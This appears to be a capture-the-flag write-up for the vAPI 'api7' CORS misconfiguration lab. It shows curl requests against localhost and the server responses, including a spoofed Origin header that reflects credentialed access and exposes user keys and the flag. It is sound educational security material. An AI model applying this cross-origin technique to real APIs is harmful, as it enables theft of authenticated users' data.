# Security misconfiguration
> Hey , its an API right? so we ARE expecting Cross Origin Requests . We just hope it works fine.

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
base64 (GNU coreutils) 9.4
echo (GNU coreutils) 9.4
```

# Create User
## POST /vapi/api7/user

Create user
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"testuser\",\x0d\x0a    \"password\":\"testpassword\"\x0d\x0a}' \
    $'http://localhost/vapi/api7/user'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 16:22:12 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 16:22:12 GMT
Content-Type: application/json

{"username":"testuser","password":"testpassword","id":2}
```

As specified in the Postman Collection, the test script to be executed for the API7 Create User endpoint is used to derive the token (Authorization-Token) by parsing the request JSON data, taking the values of the "username" and "password" key respectively with a colon between the two values, encoding the string in base64 and updates it in the Postman Environment as api7_auth.
```js
var reqData = JSON.parse(request.data);
var api7_username=reqData.username;
var api7_password=reqData.password;
var api7_auth=btoa(api7_username+":"+api7_password);
console.log("API 7 Auth : "+api7_auth);
postman.setEnvironmentVariable("api7_auth",api7_auth);
```

Manually derive the authorization token
```bash
echo -n "testuser:testpassword" | base64
```
```
dGVzdHVzZXI6dGVzdHBhc3N3b3Jk
```
- We will need the Authorization Token for the "User Login" endpoint

# User Login
## GET /vapi/api7/user/login

Log in with the newly created user
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXI6dGVzdHBhc3N3b3Jk' -H $'Content-Type: application/json' -H $'Host: localhost' \
    $'http://localhost/vapi/api7/user/login'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 17:32:31 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=221532f550b93d7ea23c8a895879c99b; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:32:31 GMT
Content-Type: application/json

{"success":"true","msg":"User logged in"} 
```
- Observe that the server gives us a Cookie for a PHP Session ID with a `Set-Cookie` HTTP response header

Cookie
```
PHPSESSID=221532f550b93d7ea23c8a895879c99b;
```
- We will need the PHP Session ID Cookie for the "Get Key" endpoint

# Get Key
## GET /vapi/api7/user/key

Get the user key for the newly created user
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    -b $'PHPSESSID=221532f550b93d7ea23c8a895879c99b' \
    $'http://localhost/vapi/api7/user/key'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 17:37:54 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:37:54 GMT
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

{"id":2,"username":"testuser","password":"testpassword","authkey":"8715a2ddefcf66d851636673949e0de88039da78540725fb94757434e3641643"}
```
- Observe that the HTTP header `Access-Control-Allow-Origin` has a value of `*`
	- This means that any domain is allowed to access this API endpoint, which is a CORS security risk.

Access the API as if it was requested from another domain with the HTTP `Origin` header.
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Content-Type: application/json' -H $'Host: localhost' -H $'Origin: super-malicious-domain.com' \
    -b $'PHPSESSID=221532f550b93d7ea23c8a895879c99b' \
    $'http://localhost/vapi/api7/user/key'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 17:47:27 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:47:27 GMT
Content-Type: application/json
Access-Control-Allow-Origin: super-malicious-domain.com
Access-Control-Allow-Credentials: true

{"flag":"flag{api7_e71b65071645e24ed50a}","user":{"id":2,"username":"testuser","password":"testpassword","authkey":"8715a2ddefcf66d851636673949e0de88039da78540725fb94757434e3641643"}}
```

API7 Flag
```
flag{api7_e71b65071645e24ed50a}
```

# Additional Information

# User Logout
## GET /vapi/api7/user/logout

Seems like we do not need to specify any cookie or authentication for this user logout endpoint, showing more misconfigurations.
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    $'http://localhost/vapi/api7/user/logout'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 17:41:17 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=8b8988055ed48a163de0555b351884e3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:41:17 GMT
Content-Type: application/json

{"success":"true","msg":"User logged out"}
```


```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    $'http://localhost/vapi/api7/user/logout'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 17:41:29 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=aacd39bf4bdc8f3959258d3e83077c71; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:41:29 GMT
Content-Type: application/json

{"success":"true","msg":"User logged out"}
```

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    $'http://localhost/vapi/api7/user/logout'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 17:41:32 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=fa59a46abb4729141976c22dbb8f17de; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 17:41:32 GMT
Content-Type: application/json

{"success":"true","msg":"User logged out"}
```

References:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
https://owasp.org/API-Security/editions/2019/en/0xa7-security-misconfiguration/
https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
